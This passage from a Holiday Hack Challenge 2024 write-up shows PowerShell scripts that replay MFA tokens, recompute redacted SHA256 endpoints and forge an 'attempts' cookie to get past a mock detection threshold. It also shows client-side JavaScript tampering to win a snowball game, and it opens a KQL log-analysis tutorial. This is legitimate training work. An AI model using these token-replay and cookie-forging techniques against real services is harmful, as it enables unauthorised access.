$mfa_req = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -WebSession $session

$mfa_cookie = New-Object System.Net.Cookie
$mfa_cookie.Name = "mfa_token"
$mfa_cookie.Value = $mfa_req.Links.href
$mfa_cookie.Domain = "localhost"
$session.cookies.Add($mfa_cookie);

$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -WebSession $session
$response.Content
```

The output below is the `$response.Content`. It looks to be a Base64 string that
I'll probably shed more light on in the next question.

```html
<h1>[+] Success</h1><br>
<p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p>
```

With just the `$response` we get the following output when not parsing the
output.

```powershell

StatusCode        : 200
StatusDescription : OK
Content           : <h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUga
                    XMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZ…
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 31 Oct 2025 18:05:02 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 227
                    
                    <h1>[+] Success</h1><br>…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 227
RelationLink      : {}


```

Initially I was attempting to do this manually. But, it looks like the timeout
for this is 2s. So, I wrote the script above. Basically, I didn't paste the
command to perform the authentication within the 2 second period so the token
expired.

```                                                                                                                     
StatusCode        : 200
StatusDescription : OK
Content           : <h1>[!] System currently in lock down</h1><br><h1>[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons</h1
                    >
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 31 Oct 2025 17:55:30 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 137
                    
                    <h1>[!] System currently…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 137
RelationLink      : {}

```

11. That looks like base64! Decode it so we can get the final secret!

Looks like we're in the end game for the silver challenge now! Need to decode
the following base64 string to finish this up.

```txt
Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
```

I scripted this with a few variables. One with the Base64 string named
`$base64_string` and another `$decoded_base64` with some .NET code to use 
`System.Text.Convert` to convert the Base64 string to text. Then I wrote the
output of the variable to the console using `Write-Output`.

```powershell
$base64_string = "Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="

$decoded_base64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64_string))

Write-Output $decoded_base64
```

After decoding. It showed the following output. Stating we were granted access
to the show cannon terminal. We have also been granted a personal password.
Which I have provided below.

- SnowLeopard2ReadyForAction

This may be useful later on in the challenge. Either this one or another one. At
this point I'm not so sure.

```powershell
Correct Token supplied, you are granted access to the snow cannon terminal. 

Here is your personal password for access: SnowLeopard2ReadyForAction
```

After that output comes. I'm greeded by a message saying I've solved the
challenge.

```powershell
Hurray! You have thwarted their defenses!
Alabaster can now access their weaponry and put a stop to it.
Once HHC grants your achievement, you can close this terminal.
```

### Solution (Gold)

> PowerShell Admin Access - Fakeout EDR Threshold
>
> From:
>
> Terminal: PowerShell
>
> They also mentioned this lazy elf who programmed the security settings in the 
> weapons terminal. He created a fakeout protocol that he dubbed Elf Detection 
> and Response "EDR". The whole system is literally that you set a threshold 
> and after that many attempts, the response is passed through... I can't 
> believe it. He supposedly implemented it wrong so the threshold cookie is 
> highly likely shared between endpoints!

> PowerShell Admin Access - Total Control
>
> From:
>
> Terminal: PowerShell
> 
> I overheard some of the other elves talking. Even though the endpoints have 
> been redacted, they are still operational. This means that you can probably 
> elevate your access by communicating with them. I suggest working out the 
> hashing scheme to reproduce the redacted endpoints. Luckily one of them is 
> still active and can be tested against. Try hashing the token with SHA256 and 
> see if you can reliably reproduce the endpoint. This might help, pipe the 
> tokens to Get-FileHash -Algorithm SHA256.

```sh
$credential = Get-Credential
Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/token_overview.csv -Credential $credential -OutFile token_overview.csv
```

Decided to start on the `token_overview.csv` file to see if we can produce a new
one with the `REDACTED` entries updated with the appropriate `SHA256` hash.

```csv
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

After downloading the file it's time to script this out.

```powershell
$tokenCsv = Import-Csv 'tokens.csv'
$newTokenCsv = "new-token-file.csv"
Write-Output 'file_MD5hash,Sha256(file_MD5hash)' | Out-File -FilePath "$newTokenCsv"

foreach ($md5 in $tokenCsv.file_MD5hash) {
	if ($md5 -Match '^[0-9a-fA-F]{32}$') {
		$hash = "$md5`n"
		$hashAsStream = [IO.MemoryStream]::new()
		$writer = [System.IO.StreamWriter]::new($hashAsStream)
		$writer.write($hash)
		$writer.Flush()
		$hashAsStream.Position = 0

		$sha256Hash = (Get-FileHash -InputStream $hashAsStream -Algorithm SHA256).Hash
		Write-Output ("$md5,$sha256Hash").ToLower() | Out-File -FilePath $newTokenCsv -Append
	} else {
		Write-Output "$md5 is not an MD5 hash"
	}
}
```

Here is the results in the `new-token-file.csv` file.

```csv
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,dfd05f3b46d21bc8556cdbf544325a945ed0304ec0bb7dbfd68ed5931e7ff6ee
664f52463ef97bcd1729d6de1028e41e,1f3c45d7e7b1f7621f67136c538c6933791d3392648c7b0f8b17fb1a6343ebd5
3e03cd0f3d335c6fb50122553f63ef78,e2dbbdbcc7e57e526841899975b6621105710e76c203c1dc30419e7f1cba5297
f2aeb18f5b3f08420eed9b548b6058c3,bc83a2c7a6279ead36370ab3509fea7483eff83c164fc7cfe3c680d879b9f9d2
32b9401a6d972f8c1a98de145629ea9d,b93772d2393029424049564b366f08b21e66282ce3d7b9da4f7a69c8891012a0
3a79238df0a92ab0afa44a85f914fc3b,989fde082fb901ae5edfd873bf41a76bf47b318f76968d0275dad99abd5894b4
49c2a68b21b9982aa9fd64cf0fd79f72,e2b80b2c70ba5982814b758849472c8711af8051e5261ce827c02818d7e1de8c
f8142c1304efb9b7e9a7f57363c2d286,704fecc829a3acb5e50e3277eafc03ca902e515cfd81bfa94670a44aca551d6a
706457f6dd78729a8bed5bae1efaeb50,f5251b4ca89f3c4eb6bbcf40ad41abc870ffb8bfc4d1e170df7ed88f23e20568
bb0564aa5785045937a35a9fa3fbbc73,a9fba920d17e1b98f393e691ec837a0ca41be8115389f2a634f77dceeaf20725
4173a7bc22aee35c5fc48261b041d064,af2b19cc9cee8005c95a321605fb2aab8577c66ebd762cc2df943fee47987d86
198b8bf2cd30a7c7fed464cca1720a88,0f8b6bd4b5d006bd7a0fceeba10a7726430ea9af7fa4314c0a83e17acaea32b6
3a7c8ecffeeadb164c31559f8f24a1e7,38810a7bea5587438cbfa6a0c364619ca4f886ec403be951cf38f5158d7da4f9
288e60e318d9ad7d70d743a614442ffc,a93f039a2d5158251d509afb2bf6bc45dec47d8ac189a170a23caea07f009476
87ab4cb29649807fdb716ac85cf560ea,89298b15becc2f6c98c53ebfebf1c91d7d569cb0895b22f840bd3b9ca400e9f7
89f3ec1275407c9526a645602d56e799,f6bc096e3570c6622ea951b3cfb852e116d0e1460576fb9fbe6f6b75dccb46c7
33539252b40b5c244b09aee8a57adbc9,3877cd419e2d8907c09de27c68babfbcd88a9d8f7bebdb4385aff288d0a39631
152899789a191d9e9150a1e3a5513b7f,1e257fca2443492c6b8621bee3117e9de40d6d6e1a7ca4861079fb74cb9dc164
7cd48566f118a02f300cdfa75dee7863,ac7458460e359b3b940540168affc7fa354c3cc05a52a52a1a6de0538ae60ec8
d798a55fca64118cea2df3c120f67569,65d70badac127dac0bcc4962107b708a37cf24b8dcd327c328a3c59a610f18ee
6ef5570cd43a3ec9f43c57f662201e55,e2692776b6ecd2c39373ced96f7ff8b64aeae56404352cf06aefc724cc4c7cf1
bf189d47c3175ada98af398669e3cac3,e433feb9de55166463e0bd4ba14a3cc099bd1ba1abf20fd290491bda3d3cf2e6
743ac25389a0b430dd9f8e72b2ec9d7f,cf056ae6605f7909a7e6126716e528b863807d2dc153a4d5aa00714ac72aadc4
270aabd5feaaf40185f2effa9fa2cd6e,f732a928cda0c4a51284f8b28401eac228ca2769804cfbcc16f2c8a0c58713f2
8b58850ee66bd2ab7dd2f5f850c855f8,d2e0f89c295194775b9835f646f5bdd950eb05cb6d912602ce4ff62a30ebe437
6fd00cbda10079b1d55283a88680d075,7a50d248e3991bf55c361e119faa292c8661f0eb6476c868db3289793391e12f
612001dd92369a7750c763963bc327f0,bc9f1a7214052f7ad3fb5076a1862e24dc71808ba27c5d9c584d681f6c3afe6b
010f2cc580f74521c86215b7374eead6,5bbe0d45c6a1fd01a7641ff4807009efc91fd7f5637dded8b71ad8e2ada5d086
29860c67296d808bc6506175a8cbb422,8fcff56c3c425a8a7163493b1f17fb330ad89fbbefddd9c5d226196c4c327bbb
7b7f6891b6b6ab46fe2e85651db8205f,f892f608096e56013c3ed96e4f984c6376617c42e328e20382660370ff181ce4
45ffb41c4e458d08a8b08beeec2b4652,d040356e54ca166cd0479d9878fc9ba1012a80419a846a58a24649f4f01b63f8
d0e6bfb6a4e6531a0c71225f0a3d908d,ff1a98e7bb3d9f87c4495ee7d62c455cbad6c6a6ad4abba25a503b7c1ae113c1
bd7efda0cb3c6d15dd896755003c635c,6297f422314ea9e9172752f3a891bd505752c5f14fcab93153bcb1038fb5ab87
5be8911ced448dbb6f0bd5a24cc36935,04519f7af02a977a27a8d9398e86354117537fa896c437019a61f46d31bfd339
1acbfea6a2dad66eb074b17459f8c5b6,5a4b06401ad22fa4cf75fe22829cb14549c4f18a18c67beb16d314b80a4f44d9
0f262d0003bd696550744fd43cd5b520,abf98108dbd1095a59bae36726fac48e3ab23da2cf2effeae02ef5c142cb76fe
8cac896f624576d825564bb30c7250eb,2dda00da692764113b97787241658a1911aeb4c0bd9b92e4fab4ffcb1fe15a33
8ef6d2e12a58d7ec521a56f25e624b80,ce92890075a6232a039bcb06b83adf90355119a99da8d694c85681e310191bb9
b4959370a4c484c10a1ecc53b1b56a7d,ae311ebe101c6ac4e11e4e338906ecedc22583fad68b85834eed3cb684fc4383
38bdd7748a70529e9beb04b95c09195d,acab8d777a0c5f9d631b4fe6e07cc14b7e063c1e48ee8a0ab876d12082ad3fea
8d4366f08c013f5c0c587b8508b48b15,01b1f4132e95b847d89fcdc599fd685e26198aa684196663c4c0b51b1a410dc4
67566692ca644ddf9c1344415972fba8,368ef0eb3bd563c81f658e6c47182524256f09212010774b00939a440dabd9f6
8fbf4152f89b7e309e89b9f7080c7230,b3395dc1f995f897f36e5ab99b7a3eada186713cc40785bb33f06c4d7c989673
936f4db24a290032c954073b3913f444,9992b3b85730ea436a546086036520bcf15d86b1a2a8f96e4d3c569148f770d3
c44d8d6b03dcd4b6bf7cb53db4afdca6,35138166ced99d6a600b52f70c818cf44826170fd88b8234107ec0bd51cc276d
cb722d0b55805cd6feffc22a9f68177d,15d6e335c167dea490ac4cd91815c56d7ecef3cd4b019588567710d839a9ea45
724d494386f8ef9141da991926b14f9b,2ae009872b65d788e44f634736689af1570333fd802b93b41df09a3f7d02c0e1
67c7aef0d5d3e97ad2488babd2f4c749,bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60
5f8dd236f862f4507835b0e418907ffc,4216b4faf4391ee4d3e0ec53a372b2f24876ed5d124fe08e227f84d687a7e06c
```

```powershell
$credential = Get-Credential
$tokenCsv = Import-Csv -Path 'new-token-file.csv'
foreach ($row in $tokenCsv) {
	$tokenUrl = "http://localhost:1225/tokens/" + $row.Sha256Hash
	$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
	$token_cookie = New-Object System.Net.Cookie
	$token_cookie.Name = "token"
	$token_cookie.Value = $row.Md5Hash
	$token_cookie.Domain = "localhost"
	$session.cookies.Add($token_cookie);

	$mfa_req = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri $tokenUrl -Credential $credential -WebSession $session
	
	$mfaUrl = "http://localhost:1225/mfa_validate/" + $row.sha256Hash
	
	$mfa_cookie = New-Object System.Net.Cookie
	$mfa_cookie.Name = "mfa_token"
	$mfa_cookie.Value = $mfa_req.Links.href
	$mfa_cookie.Domain = "localhost"
	$session.cookies.Add($mfa_cookie);
	
	$attempts_cookie = New-Object System.Net.Cookie
	$attempts_cookie.Name = "attempts"
	$attempts_cookie.Value = "c25ha2VvaWwK10"
	$attempts_cookie.Domain = "localhost"
	$session.cookies.Add($attempts_cookie);

	$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri $mfaUrl -Credential $credential -WebSession $session
	
	if ($response.Content -NotMatch "Error: Access Denied") {
		$response.Content
	}
}
```

```html
<h1>[+] Success, defense mechanisms deactivated.</h1><br>
Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
```

> Incredible! You tackled the hard path and showed off some serious PowerShell 
> expertise. This kind of skill is exactly what we need, especially with things 
> heating up between the factions.
>
> Well done! you've demonstrated solid PowerShell skills and completed the 
> challenge, giving us a bit of an edge. Your persistence and mastery are 
> exactly what we need—keep up the great work!
> 
> **Piney Sappington (Front Yard (Act II))**

## Showball Showdown

Wombley has recruited many elves to his side for the great snowball fight we 
are about to wage. Please help us defeat him by hitting him with more snowballs 
than he does to us. 

{{< image src="snowball-showdown/snowball-showdown-initial-screen.png" alt="Snowball Showdown initial game screen." position="center"  style="border-radius: 8px;" >}}

> Hi there! I'm Dusty Giftwrap, back from the battlefield! I'm mostly here for 
> the snowball fights!
> 
> But I also don't want Santa angry at us, you wouldn't like him when he's 
> angry. His face becomes as red as his hat! So I guess I'm rooting for 
> Alabaster.
> 
> Alabaster Snowball seems to be having quite a pickle with Wombley Cube. We 
> need your wizardry.
>
> Take down Wombley the usual way with a friend, or try a different strategy 
> by tweaking client-side values for an extra edge.
> 
> Alternatively, we've got a secret weapon - a giant snow bomb - but we can't 
> remember where we put it or how to launch it.
> 
> Adjust the right elements and victory for Alabaster can be secured with more 
> subtlety. Intriguing, right?
> 
> Raring to go? Terrific! Here's a real brain tickler. Navigator of chaos or 
> maestro of subtlety, which will you be? Either way, remember our objective: 
> bring victory to Alabaster.
>
> Confidence! Wit! We've got what it takes. Team up with a friend or find a way 
> to go solo - no matter how, let's end this conflict and take down Wombley!
>
> -- **Dusty Giftwrap (Front Yard (Act II))**

### Solution (Silver)

{{< image src="snowball-showdown/ss-private-room-screen.png" alt="Snowball Showdown private room game screen" position="center"  style="border-radius: 8px;" >}}

Played the initial game to see if I can win this honestly. Unfortunately not. It
would have taken far to long to try I feel. I did notice that there is a
JavaScript variable named `singlePlayer` and it's set to `false`. So that may
come in use. I am playing at a time where there aren't many others playing the
game. So, multiplayer may prove difficult.

```js
var singlePlayer = "false"
function checkAndUpdateSinglePlayer() {
    const localStorageValue = localStorage.getItem('singlePlayer');
    if (localStorageValue === 'true' || localStorageValue === 'false') {
        singlePlayer = String(localStorageValue === 'true');
    }
    const urlParams = new URLSearchParams(window.location.search);
    const urlValue = urlParams.get('singlePlayer');
    if (urlValue === 'true' || urlValue === 'false') {
        singlePlayer = String(urlValue === 'true');
    }
}
```

I set the variable found in the code snippet above to `&singlePlayer=true` to
set it to single player mode and refreshed the page.

```sh
http://hhc24-snowballshowdown.holidayhackchallenge.com/game.html?username=n3s00&roomId=11617cc00&roomType=private&id=07131657-454a-413e-974d-328fbdcbbc15&dna=ATATATTAATATATATATATGCATATATATATATCGATTAATATATATATATATATATATATATATATATGCATATGCCGATATATATATATTACGATATATATATATATGCATATATGC&singlePlayer=true
```

I looked around in the code to see if I could find anything that may help with
the game. I read the `/js/parser-snowball-game.js` file and given this is
client-side JavaScript. I thought I would try my hand at overwritting some
values in it within a Chromium workspace.

I updated the `throwSpeed` and the `throwRateOfFire` and set them both to `800`.
This will increase the rate of fire. Allowing more snowballs to be thrown.

```js
constructor() {
    super({ key: "game" });
    this.hasBgDebug = typeof window.bgDebug !== 'undefined'
    this.groundOffset = groundOffset;
    this.yellowTint = 0xffeb99;
    this.blueTint = 0x99ddff;
    this.snowballLiveTime = 12000;
    this.healingTerrain = true;
    this.terrainHealDelay = 15000;
    this.elfGroundOffset = GAME_HEIGHT - 115;
    this.wombleyXLocation = GAME_WIDTH - 40;
    this.alabasterXLocation = 40;
    this.playerMoveSpeed = 150;
    this.lastTimePlayerArrowsFromUpdate = 0
    this.lastTimePlayerArrowsFromUpdateDelay = 20
    this.percentageShotPower = 0;
    this.alabasterElvesThrowDelayMin = 2500;
    this.alabasterElvesThrowDelayMax = 5000;
    this.wombleyElvesThrowDelayMin = 1500;
    this.wombleyElvesThrowDelayMax = 2500;
    this.wombleyElvesIncompacitateTime = 2500;
    this.alabasterElvesIncompacitateTime = 5000;
    this.playerIncompacitateTime = 5000;
    this.throwSpeed = 800; // Updated
    this.throwRateOfFire = 800; // Updated
    this.lastThrowTime = 0;
    this.mouseIsOverCanvas = false;
    this.lastPointerPosition = { x: 0, y: 0 };
    this.tempMatrix = new Phaser.GameObjects.Components.TransformMatrix();
    this.tempParentMatrix = new Phaser.GameObjects.Components.TransformMatrix();
    this.lastProjectileCollisionDetectionTime = 0;
    this.projectileCollisionDetectionRate = 25;
    this.isFirefox = navigator.userAgent.toLowerCase().includes('firefox');
    this.ws = null;
    this.hand_offsets = {
        lx: 20,
        ly: 40,
        rx: 60,
        ry: 10,
    }
    this.snowball_offset = {
        x: this.hand_offsets.rx - 15,
        y: this.hand_offsets.ry - 135
    }
}
```

I updated the `snowBallBlastRadius` to `2400` and saved the override in
Chromium. This will make the blast radius larger. Increasing the possibility of
hitting the desired target.

```js 
create() {
    this.setupWebSocket();
    mainScene = this;
    if (this.isFirefox) {
        console.error("Firefox detected, please use Chrome or Safari for best experience!");
        this.add.text(5, GAME_HEIGHT - 5, "  Runs best in\nChrome or Safari!", { fontSize: '25px', fill: '#fff', fontFamily: 'monospace', stroke: '#000000', strokeThickness: 8 }).setOrigin(0, 1).setDepth(10);
    }
    this.snowBallBlastRadius = 2400; // Updated
    this.onlyMoveHorizontally = true;
    this.projectiles = this.physics.add.group();
    this.elves = [];
    this.setupBackgroundImages();
    this.setResetDestructibleScenery();
    this.anims.create({
        key: 'throw',
        frames: this.anims.generateFrameNumbers('hand_sh', { start: 0, end: 13 }),
        frameRate: 70,
        repeat: 0,
        hideOnComplete: false
    });
```

With the game patched I won and we get this screen saying that we're one step
closer to beating Wombley Cube!

{{< image src="snowball-showdown/snowball-showdown-beat-wombly.png" alt="Snowball Showdown beating Wombley" position="center"  style="border-radius: 8px;" >}}

With that being finished. I got the silver medal for this challenge and some
dialog from Dusty Giftwrap.

> Fantastic work! You've used your hacker skills to lead Alabaster’s forces to 
> victory. That was some impressive strategy!
>
> -- **Dusty Giftwrap (Front Yard (Act II))**

### Solution (Gold)

> Excellent! With Wombley’s forces defeated, they’ll have no choice but to 
> admit defeat and abandon their wild plans to hijack Christmas.
>
> Christmas is on the line! For a mischievous edge-up, dive into the game’s 
> code - a few client-side tweaks to speed, movement, or power might shift the 
> balance… or just help us find that secret weapon we misplaced!
>
> -- **Dusty Giftwrap (Front Yard (Act II))**

## Microsoft KC7 (The Great Elf Conflict)

This challenge utilizes KC7 to go through questions for this challenge. Which is
a volunteer project named the KC7 Foundation. Who's mission is to help teach
anyone with the skills to succeed in the cybersecurity workforce by creating fun
scenarios that are accessible to anyone. Either beginner or expert.

In this challenge there are four parts as listed in the headers below. All of
which increase in difficulty as you work through them.

> [Answer](http://kc7cyber.com/go/hhc24) two sections for silver, all four 
> sections for gold.

This challenge will be centered around `The Great Elf Conflict` which you can
see Pepper Minstix and Wunorse Openslae gathered in the DMZ around a globe that
says `The Great Elf Conflict`. This will take you to the KC7 page for it as
well.

{{< image src="microsoft-kc7/the-great-elf-conflict-globe.png" alt="Pepper the great elf conflict and Wunorse" position="center"  style="border-radius: 8px;" >}}

> This is weird, I got some intel about an imminent attack.
> 
> Pepper Minstix here! I’ve got urgent news from neutral ground.
>
> The North Pole is facing a serious cyber threat, and it’s putting all the 
> factions on edge. The culprits? Some troublemakers from Team Wombley.
> 
> They’ve launched a barrage of phishing attacks, ransomware, and even some 
> sneaky espionage, causing quite the stir.
>
> It’s time to jump into action and get cracking on this investigation—there’s 
> plenty of cyber-sleuthing to do.
>
> You’ll be digging into KQL logs, tracking down phishing schemes, and tracing 
> compromised accounts like a seasoned pro.
> 
> Malware infections have already breached Alabaster Snowball’s systems, so we 
> need swift action.
> 
> Your top mission: neutralize these threats, with a focus on the ransomware 
> wreaking havoc from Team Wombley.
> 
> It’s a hefty challenge, but I know you’re up to it. We need your expertise to 
> restore order and keep the peace.
> 
> You’ve got the tools, the skills, and the know-how—let’s show Team Wombley we 
> mean business.
>
> Ready to dive in? Let's defend the North Pole and bring back the holiday 
> harmony!
> 
> -- **Pepper Minstix (Front Yard (Act II))**

Here is Wunorse Opensle's dialog as well. Just for fun. It doesn't get more
techbro then Wunorse in this dialog. Granted, it doesn't provide much else apart
from more story dialog.

> Hey, Wunorse here. We at Team Wombley pulled off some nasty stuff.
>
> Phishing attacks, ransomware, and cyber espionage, oh yeah!
> 
> We pulled loads of all-nighters to make it all happen. Energy drinks rock!
>
> Our teams did what Alabaster said we never could and breached Santa's network. 
> We're so rad.
> 
> It would take a master defender to fix all the damage we caused. But defense 
> is so lame! Offense is where it's at.
>
> You should just leave them to panic and join our side. We're the coolest, 
> don't you want to be like us?
> 
> -- **Wunorse Opensle (Front Yard (Act II))**

Back to KC7. We're given a little view into the summary of the mission. I've
never worked with Kusto Query Language (KQL) or Azure Data Explorer (ADX) so I'm
excited to work through these security logs and solve the challenge.

> Welcome to your mission! In this mission, you'll be tasked with uncovering the 
> truth behind the The Great Elf Conflict. Your key tool will be the power of 
> Kusto Query Language (KQL), which you'll use to navigate through security logs 
> and uncover critical evidence of malicious activity. This challenge was created 
> as part of the SANS Holiday Hack Challenge 2024 in collaboration with Microsoft 
> Federal.

Below is the structure of this challenge. I'm showing you the complete challenge
because I took a couple of days to get this done so I could focus on other
challenges.

In this case you need to open the questions and ADX in split screen to
participate in this. It does not just open this unless I'm running into a
Firefox issue here.

{{< image src="microsoft-kc7/microsoftkc7.png" alt="intial page for microsoft kc7" position="center"  style="border-radius: 8px;" >}}

There is a lot to unpack here. So, I will get started on getting all of this
moving. Have fun reading all of this. It might be useful for me down the road in
case ADX is ever used at someone's company.

**Disclaimer:** You'll want to create and account with the KC7 Foundation and 
go through some of the initial challenges. It took me a few hours to work 
through the inial challanges of the site to reach level 10 or so. I could not 
move forward with the challenge unless I joined the game as a guest.

I will be providing the dialog from the challenges in KC7 to provide context to
these challenges.

Remember that all queries need to be run on the `NorthPoleWorkshop` database.

## Section 1: KQL 101

This is `Section 1: KQL 101` and what looks like when all of the questions have
been answered for this. There are 10 questions for this challenge. So, let's get
to it.

{{< image src="microsoft-kc7/section1.png" alt="KQL 101 section" position="center"  style="border-radius: 8px;" >}}

The thing I like about these challenges are the level of detail you're provided.
It's a breath of fresh air.

### Question 1

Initially it welcomes you to the challenge and we're informed we're going to
learn Kusto Query Language (KQL) to query the data and uncover evidence. We are
meeting Eve Snowshoes who will teach us how to use it.

> Welcome to your mission to solve the The Great Elf Conflict! To do so, you'll 
> need to harness the power of KQL (Kusto Query Language) to navigate through 
> the data and uncover crucial evidence.
>
> Your next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the 
> North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL 
> and has been eagerly awaiting your arrival.
>
> Eve greets you with a nod and gestures toward the terminal. "KQL is like a 
> key, unlocking the hidden secrets buried within the data."

Question 1 just requires you to put the text in the box and hit submit. So you
know how to do that.

**Question:** Type `let's do this` to begin your KQL training.

I typed the following into the submission form and there we go! First question
in the books.

```txt
let's do this
```

Looks like that was successful. Next!

### Question 2

The first command we're taught about is `take 10` or `take <number>`.  Which
will take the first 10 or number of data from the specified table of the
database.

> The first command Eve Snowshoes teaches you is one of the most useful in 
> querying data with KQL. It helps you peek inside each table, which is critical 
> for understanding the structure and the kind of information you're dealing 
> with. By knowing what's in each table, you’ll be able to create more precise 
> queries and uncover exactly what you need.

This command will take the first 10 employees in the `Employees` table of the
database.

```sql
Employees
| take 10
```

I was also instructed to look at the other tables for information. It looks like
there are multiple. With data related to employees, email, web traffic, passive
DNS queries, etc.

> Eve has shared the first table with you. Now, run a take 10 on all the other 
> tables to see what they contain.
> 
> You can find the tables you have access to at the top of the ADX query window.

This is an exercise in exploration. Once we're finished with it. We just enter
the text provided in the question.

**Question:** Once you've examined all the tables, type `when in doubt take 10` 
to proceed.

After running this in ADX a few times. I entered the following for my
submission.

```txt
when in doubt take 10
```

Looks like that was successful. Next!

### Question 3

Now we're getting into gathering some more information using the `count`
operator. Which will count the total rows in a table.

> Now, let’s gather more intelligence on the employees. To do this, we can use 
> the count operator to quickly calculate the number of rows in a table. This is 
> helpful for understanding the scale of the data you’re working with.

Below is the command we will be entering.

```sql
Employees
| count 
```

The output is a table that kind of looks like this. In the `NorthPoleWorkshop`
